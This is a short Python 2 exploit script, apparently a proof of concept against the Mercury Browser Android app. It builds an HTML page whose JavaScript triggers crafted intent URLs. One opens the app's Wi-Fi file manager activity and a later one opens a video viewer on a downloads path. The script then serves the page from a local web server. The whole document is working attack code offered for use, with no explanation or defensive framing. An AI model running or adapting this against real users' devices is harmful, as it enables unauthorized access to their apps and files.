
import sys
from webserver import WebServer
from BaseHTTPServer import HTTPServer

class Exploit():
    def __init__(self, port):
        self.web_port = int(port)
        self.intent_payload = "intent://stuff#Intent;component=com.ilegendsoft.mercury/com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end"
        self.write_html()
        self.web_server()
        
    def write_html(self):
        f = open("exploit.html", "w+")
        f.write('<html>')
        f.write('<body>')
        f.write('<script>')
        f.write('setTimeout(function(){ location.href="'+self.intent_payload+'" }, 1);')
        f.write('setTimeout(function(){ location.href="intent:#Intent;S.path=/sdcard/Mercury/Downloads/video.mp4;component=com.ilegendsoft.mercury/.ui.activities.filemanager.video.viewer.VideoViewerActivity;end" }, 10000);')
        f.write('</script>')
        f.write('</body>')
        f.write('</html>')
        f.close()

    def web_server(self, server_class=HTTPServer, handler_class=WebServer):
        server_address = ('0.0.0.0', self.web_port)
        httpd = server_class(server_address, handler_class)
        print 'Starting httpd...'
        httpd.serve_forever()

exploit = Exploit(sys.argv[1])
